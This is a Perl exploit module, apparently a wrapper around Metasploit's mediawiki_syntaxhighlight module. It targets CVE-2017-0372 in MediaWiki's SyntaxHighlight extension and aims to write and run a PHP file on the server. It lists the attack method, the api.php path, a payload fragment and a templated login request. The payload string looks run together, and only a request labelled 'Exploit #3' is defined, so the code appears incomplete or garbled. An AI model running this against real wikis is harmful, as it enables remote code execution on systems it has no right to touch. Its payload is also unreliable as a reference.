package MEDIAWIKI::MSF::MediawikiSyntaxhighlight;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MediawikiSyntaxhighlight";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2017-0372",
  DESCRIPTION => "

        This module exploits an option injection vulnerability in the SyntaxHighlight

        extension of MediaWiki. It tries to create & execute a PHP file in the document root.

        The USERNAME & PASSWORD options are only needed if the Wiki is configured as private.



        This vulnerability affects any MediaWiki installation with SyntaxHighlight version 2.0

        installed & enabled. This extension ships with the AIO package of MediaWiki version

        1.27.x & 1.28.x. A fix for this issue is included in MediaWiki version 1.28.2 and

        version 1.27.3.

      ",
  METHOD => "POST",
  MSF_MODULE => "mediawiki_syntaxhighlight",
  PATH => "api.php?",
  PATHS => ["api.php", "api.php", "api.php", "api.php"],
  PAYLOAD => "action=parse&format=json&contentmodel=wikitext&text=<syntaxhighlightlang=javastart=0&",
  REFERENCES => [
    "https://lists.wikimedia.org/pipermail/mediawiki-announce/2017-April/000207.html",
    "https://phabricator.wikimedia.org/T158689",
    "https://securify.nl/advisory/SFY20170201/syntaxhighlight_mediawiki_extension_allows_injection_of_arbitrary_pygments_options.html",
  ],
  TITLE => "MediaWiki SyntaxHighlight extension option injection vulnerability",
  VARIABLES => {
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'CSSFILE' =>       { DESCRIPTION => "", VALUE => "" },
    'LGTOKEN' =>       { DESCRIPTION => "", VALUE => "" },
    'LGNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'LGPASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'CLEANUP' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => 'api.php',
      PAYLOAD      => 'action=login&format=json&lgname=__USERNAME__',
      TEXT   => 'Sending Exploit #3 Request : [POST] /api.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
